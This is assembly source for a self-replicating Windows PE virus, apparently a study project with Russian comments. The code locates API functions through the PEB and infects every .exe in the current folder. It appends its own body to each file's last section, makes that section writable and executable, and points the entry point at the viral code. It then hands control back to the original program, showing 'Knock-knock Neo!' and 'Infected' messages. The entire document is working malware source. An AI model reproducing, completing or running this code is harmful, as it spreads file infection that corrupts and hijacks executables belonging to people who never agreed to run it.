; jwasm -bin -nologo -Fo virus_sc_64.bin /I "C:\wininc\Include" -10p -zf0 -W2 -D_WIN64 virus_sc.asm
; jwasm -bin -nologo -Fo virus_sc_32.bin /I "C:\masm32\include" -W2 virus_sc.asm

ifdef _WIN64
	CurrentStdcallNotation equ <fastcall>
	CurrentCdeclNotation equ <fastcall>
else 
	CurrentStdcallNotation equ <stdcall>
	CurrentCdeclNotation equ <c>
.486
endif 


option casemap:none
.model flat, CurrentStdcallNotation

include windows.inc


ifdef _WIN64
	CLIST_ENTRY typedef LIST_ENTRY64
	; машинное слово текущей архитектуры
	cword typedef qword
	cax equ <rax>
	cbx equ <rbx>
	ccx equ <rcx>
	cdx equ <rdx>
	csi equ <rsi>
	cdi equ <rdi>
	csp equ <rsp>
	cbp equ <rbp>
	OFFSET_PEB equ <60h>
	OFFSET_LDR equ <18h>
	OFFSET_INIT_LIST equ <30h>
	cur_seg_reg equ <gs>
else 
	CLIST_ENTRY typedef LIST_ENTRY32
	; машинное слово текущей архитектуры
	cword typedef dword
	cax equ <eax>
	cbx equ <ebx>
	ccx equ <ecx>
	cdx equ <edx>
	csi equ <esi>
	cdi equ <edi>
	csp equ <esp>
	cbp equ <ebp>
	OFFSET_PEB equ <30h>
	OFFSET_LDR equ <0Ch>
	OFFSET_INIT_LIST equ <1Ch>
	cur_seg_reg equ <fs>
endif

include pe_parser.inc




Stdcall0 typedef proto CurrentStdcallNotation
Stdcall1 typedef proto CurrentStdcallNotation :cword
Stdcall2 typedef proto CurrentStdcallNotation :cword, :cword
Stdcall3 typedef proto CurrentStdcallNotation :cword, :cword, :cword
Stdcall4 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword
Stdcall5 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword, :cword
Stdcall6 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword, :cword, :cword
Stdcall7 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword, :cword, :cword, :cword
Stdcall8 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword, :cword, :cword, :cword, :cword
Stdcall9 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword, :cword, :cword, :cword, :cword, :cword
;StdcallVararg typedef proto CurrentStdcallNotation :vararg
CdeclVararg typedef proto CurrentCdeclNotation :vararg

DefineStdcallVarargProto macro name:req
    sc_&name equ <StdcallVararg ptr [cbx + p_&name]>
endm

DefineStdcallProto macro name:req, count:req
    sc_&name equ <Stdcall&count ptr [cbx + p_&name]>
endm

DefineCProto macro name:req
    sc_&name equ <CdeclVararg ptr [cbx + p_&name]>
endm

DefineStr macro name:req
    ;@CatStr(str,name) db "@CatStr(,name)", 0
    str_&name db "&name&", 0
endm

DefineStrOffsets macro name:req, strNames:vararg
    name:
    for i, <&strNames>
        cword offset str_&i
    endm
    name&Count = ($ - name) / sizeof(cword)
endm

DefinePointers macro name:req, namePointers:vararg
    name:
    for i, <&namePointers>
        p_&i cword 0
    endm
endm

DefineFuncNamesAndPointers macro funcNames:vararg
    for i, <&funcNames>
        DefineStr i
    endm
    DefineStrOffsets procNames, funcNames
    DefinePointers procPointers, funcNames
endm



FindProcAddressByName proto stdcall :ptr byte
FindProcAddress proto stdcall :ptr byte, :ptr byte
FindProcArray proto stdcall :ptr byte, :ptr byte, :cword

InfectionFile proto CurrentStdcallNotation
InfectLastSection proto stdcall :cword, :cword, :cword
ExtendLastSection proto CurrentStdcallNotation :cword, :cword, :cword, :cword
LoadPeFile proto CurrentStdcallNotation :ptr byte, :ptr byte, :cword
UnloadPeFile proto CurrentStdcallNotation :cword
SectionAlignment proto CurrentStdcallNotation :cword, :cword
AlignToBottom proto CurrentStdcallNotation :cword, :cword
RvaToOffset proto CurrentStdcallNotation :cword, :cword

DefineStdcallProto MessageBoxA, 4
DefineStdcallProto VirtualProtect, 4
DefineStdcallProto WriteProcessMemory, 5

DefineStdcallProto CreateFileA, 7
DefineStdcallProto GetFileSize, 2
DefineStdcallProto CreateFileMappingA, 6
DefineStdcallProto CloseHandle, 1
DefineStdcallProto MapViewOfFile, 5
DefineStdcallProto UnmapViewOfFile, 1
DefineStdcallProto FindFirstFileA, 2
DefineStdcallProto FindNextFileA, 2
DefineStdcallProto FindClose, 1

DefineCProto memset
DefineCProto memcpy
DefineCProto strcpy


sc segment

start:
ifdef _WIN64
    lea cbx, start
else
    call $+5
    pop cbx
    sub cbx, 5
endif
    
main proc
local   pBase:cword
local   pLoadLibraryA:cword
local 	pVirtualProtect:cword
local 	oldProtect:cword

    ; сохраняем базовый адрес
    mov [pBase], cbx

    ; получаем адрес функции LoadLibraryA в kernel32.dll
    invoke FindProcAddressByName, addr [cbx + str_LoadLibraryA]
    mov [pLoadLibraryA], cax
    ; pLoadLibrary = FindProcAddressByName ("LoadLibraryA")

	;загружаю библиотеки kernel32.dll и user32.dll
    invoke Stdcall1 ptr [pLoadLibraryA], addr [cbx + str_Kernel32]
    invoke Stdcall1 ptr [pLoadLibraryA], addr [cbx + str_User32]
	
    invoke FindProcArray, addr [cbx + procNames], addr [cbx + procPointers], procNamesCount	
	
	; Сообщение от вируса
	invoke sc_MessageBoxA, NULL, addr [cbx + matrix_msg], NULL, NULL
    
    invoke InfectionFile
    
	;возвращаем управление на оригинальный код
ifdef _WIN64
	; code for 64
	mov cax, [cbx - sizeof(cword)]
	jmp cax
else
	; code for 32
	mov eax, [cbx - sizeof(cword)]
	jmp eax
	
endif
	ret
main endp


InfectionFile proc CurrentStdcallNotation
	local hFindFile:HANDLE
	local findData:WIN32_FIND_DATAA
	local pe:PeParser
	local codeSize:cword

	ifdef _WIN64
		mov [rbp + 10h], rcx
		mov [rbp + 18h], rdx
		mov [rbp + 20h], r8
		mov [rbp + 28h], r9
	endif
	
    invoke sc_FindFirstFileA, addr [cbx + exe_file_mask], addr findData
	.if cax == -1
		invoke sc_MessageBoxA, NULL, addr [cbx + msg_file_error], NULL, NULL
		ret
	.endif
    
	mov [hFindFile], cax
	
	.while cax != 0
		invoke sc_MessageBoxA, NULL, addr [findData].WIN32_FIND_DATAA.cFileName, NULL, NULL
		
		invoke LoadPeFile, addr [findData].WIN32_FIND_DATAA.cFileName , addr [pe], 0
		.if cax == 1
			mov ccx, endCode
			sub ccx, start
			mov [codeSize], ccx
			
			
			invoke InfectLastSection, addr [pe], addr [cbx + start], [codeSize]
			invoke UnloadPeFile, addr [pe]
		.endif
		
		invoke sc_FindNextFileA, [hFindFile], addr [findData]   
    .endw
	
    invoke sc_FindClose, [hFindFile]
    ret
InfectionFile endp

InfectLastSection proc stdcall pe:cword, code:cword, codeSize:cword
	local dst:cword
	local src:cword
	local rawNewData:cword
	local rvaNewData:cword
	local entryOffset:cword
	
	;проверяю сигнатуру в FileHeader
	mov cax, [pe]
	mov cax, [cax].PeParser.nthead
	mov edx, [cax].IMAGE_FILE_HEADER.NumberOfSymbols
	.if edx == 00ABBA00h
		invoke sc_MessageBoxA, NULL, addr [cbx + msg_file_already_infected], NULL, NULL
		ret
	.endif
	
	;записываю сигнатуру в FileHeader
	mov cax, [pe]
	mov cax, [cax].PeParser.nthead
	mov [cax].IMAGE_FILE_HEADER.NumberOfSymbols, 00ABBA00h
	
	;вычисляю точку входа IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint + IMAGE_OPTIONAL_HEADER.ImageBase
	mov cdx, [pe]
	mov cdx, [cdx].PeParser.nthead
	lea cdx, [cdx].IMAGE_NT_HEADERS.OptionalHeader
	lea cdx, [cdx].IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint
	mov edx, dword ptr [cdx]
	mov edx, edx
	mov [entryOffset], cdx
	mov cax, [pe]
	mov cax, [cax].PeParser.nthead
	lea cax, [cax].IMAGE_NT_HEADERS.OptionalHeader
	mov cax, [cax].IMAGE_OPTIONAL_HEADER.ImageBase
	add [entryOffset], cax
	
	; Расширяем последнюю секцию и получаем ее виртуальный адрес и файловое смещение
    ; ExtendLastSection (pe, codeSize, &rvaNewData, &rawNewData);
	invoke ExtendLastSection, [pe], [codeSize], addr [rvaNewData], addr [rawNewData]
	
	;копируем вирус в новую память,
	;но оставляем в начале место для адреса возврата на оригинальный код
	mov cax, [pe]
	mov cdx, [cax].PeParser.mem
	add cdx, [rawNewData]
	add cdx, sizeof(cword)
	mov [dst], cdx
	invoke sc_memcpy, [dst], [code], [codeSize]
	
	; адрес возврата на оригинальный код
	mov cax, [pe]
	mov cdx, [cax].PeParser.mem
	add cdx, [rawNewData]
	mov cax, [entryOffset]
	mov cword ptr [cdx], cax
	
	;меняем оригинальную точку входа на начало шелкода
	mov cax, [pe]
	mov cax, [cax].PeParser.nthead
	lea cax, [cax].IMAGE_NT_HEADERS.OptionalHeader
	mov cdx, [rvaNewData]
	add cdx, sizeof(cword)
	mov dword ptr [cax].IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint, edx
	
	mov cax, [pe]
	mov cax, [cax].PeParser.nthead
	lea cax, [cax].IMAGE_NT_HEADERS.FileHeader
	mov dx, [cax].IMAGE_FILE_HEADER.Characteristics
	or dx, IMAGE_FILE_RELOCS_STRIPPED
	mov word ptr [cax].IMAGE_FILE_HEADER.Characteristics, dx
	
	invoke sc_MessageBoxA, NULL, addr [cbx + msg_done], NULL, NULL
	ret
InfectLastSection endp

SectionAlignment proc CurrentStdcallNotation value:cword, alignv:cword
	local maskv:cword
	
	ifdef _WIN64 
		mov [rbp + 10h], rcx
		mov [rbp + 18h], rdx
		mov [rbp + 20h], r8
		mov [rbp + 28h], r9
	endif
	
	mov cax, cword ptr [alignv]
	dec cax
	not cax
	mov [maskv], cax
	
	mov cax, cword ptr [value]
	add cax, cword ptr [alignv]
	dec cax
	and cax, cword ptr [maskv]
	ret
SectionAlignment endp

ExtendLastSection proc CurrentStdcallNotation pe:cword, additionalSize:cword, rvaNewData:cword, rawNewData:cword
	local alignment:cword
	local lastSection:cword
	local newFileSize:cword
	local newVirtualAndFileSize:cword
	local deltaFileSize:cword
	local offsetToNewSectionData:cword
	
	ifdef _WIN64 
		mov [rbp + 10h], rcx
		mov [rbp + 18h], rdx
		mov [rbp + 20h], r8
		mov [rbp + 28h], r9
	endif
	
	mov cax, [pe]
	mov cax, [cax].PeParser.nthead
	lea cax, [cax].IMAGE_NT_HEADERS.OptionalHeader
	mov eax, dword ptr [cax].IMAGE_OPTIONAL_HEADER.SectionAlignment
	mov [alignment], cax
	
	mov [newFileSize], 0
	mov [newVirtualAndFileSize], 0
	
	mov cdx, [pe]
	mov cax, [cdx].PeParser.sections
	mov edx, [cdx].PeParser.countSec
	dec edx
	imul cdx, sizeof(IMAGE_SECTION_HEADER)
	add cax, cdx
	mov [lastSection], cax
	
	;offsetToNewSectionData = max (lastSection->SizeOfRawData, lastSection->Misc.VirtualSize);
	mov edx, [cax].IMAGE_SECTION_HEADER.SizeOfRawData
	mov eax, [cax].IMAGE_SECTION_HEADER.Misc.VirtualSize
	.if edx > eax
		mov cax, cdx
	.endif
	mov [offsetToNewSectionData], cax
	
	;newVirtualAndFileSize = offsetToNewSectionData + additionalSize;
	add cax, cword ptr [additionalSize]
	mov [newVirtualAndFileSize], cax
	
	;Выравниваем новый размер по величине выравнивания в памяти.
	;newVirtualAndFileSize = SectionAlignment (newVirtualAndFileSize, align);
	mov cdx, cax
	invoke SectionAlignment, cdx, cword ptr [alignment]
	mov [newVirtualAndFileSize], cax
	
	; на сколько увеличивается размер файла
	; deltaFileSize = newVirtualAndFileSize - lastSection->SizeOfRawData;
	mov cdx, [lastSection]
	mov edx, dword ptr [cdx].IMAGE_SECTION_HEADER.SizeOfRawData
	sub cax, cdx
	mov [deltaFileSize], cax
	
	; Выгружаем файл и загружаем с увеличенным размером.
    ; Новый блок будет заполнен нулями.
	; UnloadPeFile (pe);
	mov cdx, [pe]
	invoke UnloadPeFile, cdx
	
	;LoadPeFile (pe->filename, pe, pe->filesize + deltaFileSize);
	mov cdx, [pe]
	mov ccx, [cdx].PeParser.filename
	mov cax, [cdx].PeParser.filesize
	add cax, [deltaFileSize]
	invoke LoadPeFile, ccx, cdx, cax
	
	; lastSection = pe->sections + pe->countSec - 1;
	mov cax, [pe]
	mov cdx, [cax].PeParser.sections
	mov eax, [cax].PeParser.countSec
	dec cax
	imul cax, sizeof(IMAGE_SECTION_HEADER)
	add cdx, cax
	mov [lastSection], cdx
	
	; права секции
	;mov eax, IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_WRITE or IMAGE_SCN_CNT_CODE
	mov ecx, [cdx].IMAGE_SECTION_HEADER.Characteristics
	;and ecx, eax
	or ecx, IMAGE_SCN_MEM_READ
	or ecx, IMAGE_SCN_MEM_EXECUTE
	or ecx, IMAGE_SCN_MEM_WRITE
	or ecx, IMAGE_SCN_CNT_CODE
	mov [cdx].IMAGE_SECTION_HEADER.Characteristics, ecx

	
	; обновляем размер образа программы
	;pe->nthead->OptionalHeader.SizeOfImage += 
    ;	SectionAlignment (newVirtualAndFileSize, align) - SectionAlignment (lastSection->Misc.VirtualSize, align);
	invoke SectionAlignment, [newVirtualAndFileSize], [alignment]
	mov cdx, cax
	push cdx ; на 64 аргументы для функций портят rdx, rcx
	mov cax, [lastSection]
	
	mov cax, cax
	mov eax, [cax].IMAGE_SECTION_HEADER.Misc.VirtualSize
	invoke SectionAlignment, cax, [alignment]
	
	pop cdx
	sub cdx, cax
	add cdx, 1000h ; чтоб VirtualProtect(addr,1000,...) в расширенном пространстве не попадал за пределы доступной памяти
	invoke SectionAlignment, cdx, [alignment]
	mov cdx, cax

	mov cax, [pe]
	mov cax, [cax].PeParser.nthead
	lea cax, [cax].IMAGE_NT_HEADERS.OptionalHeader
	add [cax].IMAGE_OPTIONAL_HEADER.SizeOfImage, edx
	
	; обновляем размеры секции в файле и в памяти
	;lastSection->SizeOfRawData = newVirtualAndFileSize;
	mov cdx, [lastSection]
	mov cax, [newVirtualAndFileSize]
	mov [cdx].IMAGE_SECTION_HEADER.SizeOfRawData, eax
	
	; lastSection->Misc.VirtualSize = newVirtualAndFileSize;
	push cdx
	add eax, 1000h
	invoke SectionAlignment, cax, [alignment]
	pop cdx
	mov [cdx].IMAGE_SECTION_HEADER.Misc.VirtualSize, eax
	
	;*rvaNewData = lastSection->VirtualAddress + offsetToNewSectionData;
	mov cdx, [lastSection]
	mov ecx, [cdx].IMAGE_SECTION_HEADER.VirtualAddress
	add ccx, [offsetToNewSectionData]
	mov cax, [rvaNewData]
	mov cword ptr [cax], ccx
	
	;*rawNewData = lastSection->PointerToRawData + offsetToNewSectionData;
	mov ecx, [cdx].IMAGE_SECTION_HEADER.PointerToRawData
	add ccx, [offsetToNewSectionData]
	mov cax, [rawNewData]
	mov cword ptr [cax], ccx
	
	ret
ExtendLastSection endp


; Осуществляет поиск адресов функций, смещения до имен которых от регистра cbx,
; переданы в первом аргументе funcNames.
; Адреса сохраняются по соответствующим индексам в массиве funcAddress.
; void FindProcArray (in char **funcNames, out void **funcAddress, int funcCount);
FindProcArray proc stdcall uses cdi funcNames:ptr byte, funcAddress:ptr byte, funcCount:cword

local i:cword
local funcName:cword
    
;ifdef _WIN64
;	mov [rbp + 10h], rcx
;	mov [rbp + 18h], rdx
;	mov [rbp + 20h], r8
;	mov [rbp + 28h], r9
;endif
	
    mov [i], 0

@@:
    mov cax, [i]
    cmp cax, [funcCount]
    jge @f
    
    mov cdi, [funcNames]
    mov cdi, [cdi + sizeof(cword) * cax]
    add cdi, cbx
    push cdi
    mov cdi, [funcAddress]
    lea cdi, [cdi + sizeof(cword) * cax]
    call FindProcAddressByName
    mov [cdi], cax
    
    inc [i]
    jmp @b
@@:

    ret

FindProcArray endp

;
; функция сравнения ASCII-строк
; bool CmpStr (char *str1, char *str2)
;
CmpStr:

    mov cax, [csp+sizeof(cword)]
    mov ccx, [csp+2*sizeof(cword)]
@@:
    mov dl, [cax]
    cmp dl, byte ptr [ccx]
    jne ret_false
    test dl, dl
    je ret_true
    inc cax
    inc ccx
    jmp @b

ret_false:
    xor cax, cax

    ; при равенстве строк возвращается адрес нулевого символа одной из строк
    ; но главное, что ненулевое значение
ret_true:
    retn 2 * sizeof(cword)


;
; Осуществляет поиск функции по имени во всех загруженных библиотеках из PEB'а.
; void * FindProcAddressByName (char * procName);
;
FindProcAddressByName proc stdcall uses cdi cbx procName:ptr byte

	;ifdef _WIN64
	;	mov [rbp + 10h], rcx
	;	mov [rbp + 18h], rdx
	;	mov [rbp + 20h], r8
	;	mov [rbp + 28h], r9
	;endif

    assume cur_seg_reg:nothing
    mov cbx, [cur_seg_reg:OFFSET_PEB]       ; cbx = ptr _PEB
    mov cbx, [cbx+OFFSET_LDR]      ; cbx = ptr _PEB_LDR_DATA
    lea cbx, [cbx+OFFSET_INIT_LIST]      ; cbx = ptr InInitializationOrderModuleList.Flink

    mov cdi, cbx            ; cdi = голова списка
    mov cbx, [cbx]          ; cbx = InInitializationOrderModuleList.Flink
    .while cbx != cdi
        push [procName]
        push cword ptr [cbx+sizeof(CLIST_ENTRY)]    ; LDR_DATA_TABLE_ENTRY.DllBase
                                    ; 10h - смещение от элемента InInitializationOrderLinks
        call FindProcAddress
        .if cax
            .break          ; в случае возврата cax будет содержать адрес функции
        .endif
        
        mov cbx, [cbx]          ; cbx = LDR_DATA_TABLE_ENTRY.InInitializationOrderLinks.Flink
        xor cax, cax            ; обнуляем cax для возврата из функции
    .endw

    ret

FindProcAddressByName endp

;
; Осуществляет поиск адреса функции по ее имени в таблице экспорта
; void *FindProcAddress (void *baseLib, char *procName)
;
FindProcAddress proc stdcall uses cdi csi cbx baseLib:ptr byte, procName:ptr byte

local functionsArray:cword
local namesArray:cword
local nameOcdinalsArray:cword

    mov cbx, [baseLib]
    
    mov eax, [cbx].IMAGE_DOS_HEADER.e_lfanew    ; cax = offset PE header
    
    ; esi = rva export directory
    mov esi, [cbx + cax].IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    add csi, cbx                ; esi = va export directory
    
    mov eax, [csi].IMAGE_EXPORT_DIRECTORY.AddressOfFunctions    ; eax = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions
    add cax, cbx
    mov [functionsArray], cax
    
    mov eax, [csi].IMAGE_EXPORT_DIRECTORY.AddressOfNames        ; eax = IMAGE_EXPORT_DIRECTORY.AddressOfNames
    add cax, cbx
    mov [namesArray], cax
    
    mov eax, [csi].IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals ; eax = IMAGE_EXPORT_DIRECTORY.AddressOfNameOcdinals
    add cax, cbx
    mov [nameOcdinalsArray], cax
    
    xor edi, edi

@@:
        cmp edi, [csi].IMAGE_EXPORT_DIRECTORY.NumberOfNames      ; cdi < IMAGE_EXPORT_DIRECTORY.NumberOfNames
        
        ; после сравнения строк на предыдущей итерации eax=0
        jge find_ret

        mov cax, [namesArray]
        mov eax, [cax+cdi*sizeof(dword)]
        add cax, cbx
        push [procName]
        push cax
        call CmpStr
        test cax, cax
        jne  @f

        inc edi
        jmp @b
@@:
    
    mov cax, [nameOcdinalsArray]
    movzx cdi, word ptr [cax+cdi*sizeof(word)]
    mov cax, [functionsArray]
    mov eax, [cax+cdi*sizeof(dword)]
    add cax, cbx
    
find_ret:
    
    ret

FindProcAddress endp


include pe_parser.asm


DefineStr ExitProcess
DefineStr LoadLibraryA

str_Kernel32 db "kernel32.dll", 0
str_User32 db "User32.dll", 0


matrix_msg:
db "Knock-knock Neo!", 10,0
dec_format:
db "size code %08d", 10, 0
msg_file_error:
db "File not found", 10, 0
msg_file_already_infected:
db "ERROR: File already infected!", 10, 0
exe_file_mask:
db "./*.exe", 0
msg_done:
db "Infected", 0

DefineFuncNamesAndPointers WriteProcessMemory, CreateFileMappingA, VirtualProtect, MessageBoxA, printf, strlen, FindFirstFileA, FindNextFileA, FindClose, GetSystemDirectoryA, CreateFileA, GetFileSize, CreateFileMapping, CloseHandle,  MapViewOfFile, UnmapViewOfFile, memcpy


endCode:

sc ends

end
